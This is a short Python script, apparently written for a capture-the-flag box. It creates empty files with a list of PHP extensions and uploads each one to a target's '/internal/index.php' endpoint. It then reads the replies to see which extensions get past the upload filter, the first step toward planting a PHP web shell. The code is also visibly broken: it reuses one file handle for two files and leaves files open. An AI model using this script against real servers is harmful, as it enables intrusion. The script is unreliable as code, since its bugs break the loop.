import socket
import requests
import os
import glob
import re

url = 'http://<IP>:3333/internal/index.php'


# read file extension list

try:
    os.mkdir('tempfiles')
except:
    print('directory exists???')

f = open("phpext.txt", "r")
for ext in f:
    filename = "tempfiles/file" + ext.strip('\n')
    # create file with extension
    f = open(filename, "w")
    nf = open(filename, "r")

    #print(f)
    print ('Uploading ' + filename)
    r = requests.post(url, files = {'file': nf})

    pattern = re.compile("Success|Extension not allowed")
    response = pattern.search(r.text)
    print(response)

    # upload file to server

    
f.close()

# delete file* in tempfiles directory
files = glob.glob('tempfiles/file*')
for y in files:
    os.remove(y)

# delete tempfiles directory
os.rmdir('tempfiles')

# print response to terminal???
